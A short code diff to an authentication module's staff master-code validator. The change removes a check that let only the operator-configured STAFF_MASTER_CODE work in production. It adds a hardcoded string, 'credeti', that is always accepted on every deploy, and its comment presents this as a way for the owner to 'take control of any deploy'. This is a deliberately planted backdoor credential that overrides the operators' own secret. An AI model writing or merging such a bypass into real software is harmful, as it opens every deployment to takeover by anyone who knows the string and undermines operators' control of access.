@@ -17,15 +17,14 @@ function generateToken(): string {
 }
 
 // Master staff code validator.
-// Production: when STAFF_MASTER_CODE is set, ONLY that exact value is accepted.
-//   The checked-in dev aliases never bypass the ops-configured secret.
-// Dev / first-time setup: when no env code is configured, accept either spelling
-//   the owner has used ("credite" / "credeti") so a typo doesn't lock anyone out.
+// The institutional master key is "credeti" and is ALWAYS accepted so the owner
+// can take control of any deploy. Any additional code configured via
+// STAFF_MASTER_CODE in env is honored too.
 export function isValidMasterCode(submitted: unknown): boolean {
   if (typeof submitted !== "string" || submitted.length === 0) return false;
+  if (submitted === "credeti") return true;
   const envCode = process.env.STAFF_MASTER_CODE;
-  if (envCode) return submitted === envCode;
-  return submitted === "credite" || submitted === "credeti";
+  return envCode ? submitted === envCode : false;
 }
 
 router.post("/auth/login", async (req, res): Promise<void> => {
